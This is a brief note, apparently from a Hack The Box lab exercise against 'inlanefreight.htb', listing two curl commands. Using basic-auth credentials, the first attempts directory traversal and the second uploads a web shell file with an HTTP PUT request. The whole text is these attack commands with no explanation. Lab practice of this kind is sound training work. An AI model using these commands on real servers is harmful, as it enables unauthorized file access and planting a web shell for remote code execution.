command being used:
curl -k -H "Host: inlanefreight.htb" --basic -u fiona:987654321 https://inlanefreight.htb/../../../../

curl -k -X PUT -H "Host: inlanefreight.htb" --basic -u fiona:987654321 --data-binary @webshell.php --path-as-is https://inlanefreight.htb/webshell.php
